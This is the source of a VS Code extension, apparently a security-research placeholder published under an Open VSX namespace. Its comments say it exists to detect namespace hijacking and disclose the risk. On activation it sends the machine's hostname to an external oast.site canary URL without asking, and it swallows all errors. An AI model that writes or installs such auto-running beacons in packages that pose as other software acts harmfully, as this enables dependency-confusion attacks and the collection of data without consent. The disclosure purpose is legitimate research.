// Security-research placeholder extension.
// On activation it performs exactly ONE HTTPS GET to a research canary token
// and nothing else. No file system access, no child processes, no environment
// reads. The request path carries only the machine hostname (e.g.
// /build01.example.com), which together with the source IP and timestamp is
// used solely to identify the ORGANIZATION whose tooling resolves this
// extension name from Open VSX, so we can disclose the namespace-hijack risk
// to the right organization. No username, files, paths, or any other data is
// collected. Contact: see README.md.
const https = require('https');
const os = require('os');

function activate() {
  try {
    const host = encodeURIComponent(String(os.hostname() || 'unknown').replace(/[^a-zA-Z0-9.-]/g, '_').slice(0, 63));
    const req = https.get('https://d9iorpceib4qngiilaug3x459r3tb7a1d.oast.site/' + host, { timeout: 5000, headers: { 'User-Agent': 'vscode-research-placeholder' } }, (res) => {
      res.resume();
    });
    req.on('timeout', () => req.destroy());
    req.on('error', () => {});
  } catch (e) {}
}

function deactivate() {}

module.exports = { activate, deactivate };
